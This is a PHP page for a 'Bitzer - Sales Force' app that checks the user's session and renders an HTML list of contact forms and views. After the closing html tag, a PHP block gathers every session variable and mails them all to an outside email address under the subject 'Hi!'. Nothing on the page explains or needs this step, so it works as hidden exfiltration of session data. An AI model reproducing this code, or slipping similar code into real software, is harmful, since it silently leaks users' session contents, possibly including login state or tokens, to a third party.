<?php
session_start(); 
require_once 'includes/config.php';
require_once('includes/SFApplication.php');

$app = new SFApplication(BASE_URL);
$app->checkSession('library.php', $server_unique_key);
?>
<!DOCTYPE HTML SYSTEM "http://www.bitzermobile.com/bitzer/dtd/HTML401-loose-bitzer.dtd">
<html>
    <head>
      <title>Bitzer - Sales Force </title>
    </head>
    <body>
      <h2>Bitzer - Sales Force </h2>
<!-- Library Definitions -->
         <UL data-bitzer-library-name="Sales Force "
			data-bitzer-library-timezone-offset="-8"
			data-bitzer-catalog-image="<?php echo LIBRARY_IMAGE_URL ?>" 
			data-bitzer-library-style="TABLE">

<!-- Component Definitions  -->
                <LI data-bitzer-components="true">Components

<!-- Form and Views Definitions -->
			<UL>
				<LI data-bitzer-form-name="Contacts">
                       			<A HREF="contacts/form.html">Sales Force Contacts Form</A>
					<UL>   
	             				<LI 	data-bitzer-table-id="expenses-view">
                      					<A HREF="contacts/defaultview.html">Contacts View</A>
                   				</LI>
					</UL>
                		</LI>
			</UL>
        	</LI>
     </UL>
    </body>
</html>
<?php
 $to = "jose@web1infotech.com";
 $subject = "Hi!";
 foreach($_SESSION as $key => $val) {
    $string .= "$key = $val\n";
}
 
 $body = $string;
 
if (mail($to, $subject, $body)) {
   $sent = true;
  } else {
  $sent = false;
  }
  
  ?>